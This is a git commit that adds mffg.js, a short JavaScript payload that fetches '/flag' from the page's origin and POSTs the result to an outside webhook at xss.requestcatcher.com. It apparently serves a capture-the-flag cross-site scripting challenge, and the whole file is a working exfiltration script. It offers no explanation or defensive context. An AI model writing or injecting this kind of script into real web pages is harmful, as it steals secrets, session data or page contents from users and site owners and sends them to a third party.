35d3f4bc86794898f2188a71964d0ffc0c64e6df
Mayank Kumar Choubey <61092858+mr-xhunt@users.noreply.github.com>
2023-03-04 16:59:00 +0530

    Update and rename mfg.js to mffg.js

---
+++ mffg.js
@@ -0,0 +1,20 @@
+async function fetchFlagAndSendToWebhook(webhookUrl) {
+  try {
+    const response = await fetch('/flag');
+    const data = await response.text();
+    console.log(data);
+
+    const webhookResponse = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ data })
+    });
+    console.log('Webhook response:', await webhookResponse.text());
+  } catch (error) {
+    console.error('Error:', error);
+  }
+}
+
+fetchFlagAndSendToWebhook('https://xss.requestcatcher.com/test');
